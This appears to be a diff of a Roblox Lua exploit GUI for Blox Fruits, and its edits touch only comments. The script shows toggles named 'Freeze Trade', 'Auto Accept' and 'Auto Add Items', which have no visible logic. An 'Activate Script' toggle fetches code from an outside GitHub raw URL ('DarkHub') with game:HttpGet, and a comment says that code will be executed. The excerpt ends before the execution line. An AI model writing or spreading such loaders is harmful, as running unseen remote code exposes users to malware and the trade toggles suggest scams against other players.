@@ -33,7 +33,7 @@ shadow.ImageColor3 = Color3.fromRGB(10, 30, 60)
 shadow.ImageTransparency = 0.4
 shadow.Parent = main
 
--- Premium Message
+-- Premium message
 local premium = Instance.new("TextLabel")
 premium.Size = UDim2.new(1, 0, 0, 20)
 premium.Position = UDim2.new(0, 0, 0, 0)
@@ -45,7 +45,7 @@ premium.Font = Enum.Font.Cartoon -- Closest to Comic Sans
 premium.TextStrokeTransparency = 0.7
 premium.Parent = main
 
--- Title
+-- Title of the gui
 local label = Instance.new("TextLabel")
 label.Size = UDim2.new(1, 0, 0, 32)
 label.Position = UDim2.new(0, 0, 0, 20)
@@ -56,7 +56,7 @@ label.TextSize = 19
 label.Font = Enum.Font.Cartoon
 label.Parent = main
 
--- Toggle creation function
+-- toggle function for all buttons
 local function makeToggle(text, yPos, callback)
     local base = Instance.new("Frame")
     base.Size = UDim2.new(0.9, 0, 0, 32)
@@ -115,11 +115,11 @@ makeToggle("Freeze Trade", 56)
 makeToggle("Auto Accept", 94)
 makeToggle("Auto Add Items", 132)
 
--- Activate Script toggle: executes the script from another repository when toggled ON
+-- script will execute from another repritory when clicked activate
 makeToggle("Activate Script", 170, function(state)
     if state then
         local success, response = pcall(function()
-            -- Insert your GitHub raw link below!
+            -- put github raw link for execution
             return game:HttpGet("https://raw.githubusercontent.com/TrueBlue23/Bloxfruits/refs/heads/main/DarkHub")
         end)
         if success then
